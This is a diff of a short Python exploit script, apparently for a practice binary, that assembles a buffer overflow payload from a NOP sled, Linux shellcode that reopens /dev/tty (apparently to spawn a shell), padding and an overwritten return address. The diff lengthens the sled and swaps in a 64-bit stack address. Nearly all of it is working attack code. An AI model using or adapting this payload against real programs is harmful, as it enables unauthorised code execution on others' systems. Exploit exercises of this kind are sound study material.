@@ -7,7 +7,7 @@
 # RIP 0x7ffff7e200f5
 # NOP = 0x90
 
-nopsled = b"\x90" * 17
+nopsled = b"\x90" * 72
 
 
 buf =  b""
@@ -30,8 +30,9 @@ shellcode = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\x
 
 padding = b"A"*(72-17-55)
 
-# 
-eip = b"\xec\x11\x40"
+# 0x7fffffffe5a8
+# 0x7fffffffe6c0
+eip = b"\xc0\xe6\xff\xff\xff\x7f"
 
 print (nopsled + shellcode + padding + eip) 
 
